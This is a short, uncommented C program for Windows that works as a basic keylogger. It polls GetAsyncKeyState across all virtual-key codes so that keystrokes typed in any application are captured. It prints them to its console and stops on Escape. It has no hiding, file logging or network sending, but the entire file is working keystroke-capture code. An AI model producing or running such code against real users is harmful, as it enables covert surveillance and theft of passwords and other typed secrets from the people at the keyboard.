#include <windows.h>
#include <stdio.h>


int main() {
    while (1) {
        for (int key = 8; key <= 255; ++key) {
            if (GetAsyncKeyState(key) & 0x8000) {  // Check if key is pressed
                if (key == VK_SPACE) {
                    printf("[SPACE]");
                }
                else if (key == VK_TAB) {
                    printf("[TAB]");
                }
                else if (key == VK_SHIFT) {
                    printf("[SHIFT]");
                }
                else if (key == VK_RETURN) {
                    printf("\n[ENTER]\n");
                }
                else if (key == VK_ESCAPE) {
                    return 0;  
                }
                else {
                    char charKey = MapVirtualKey(key, MAPVK_VK_TO_CHAR);
                        printf("%c", charKey);
                    }
                
                Sleep(100);  
            }
        }
        Sleep(10);  
    }
    return 0;
}
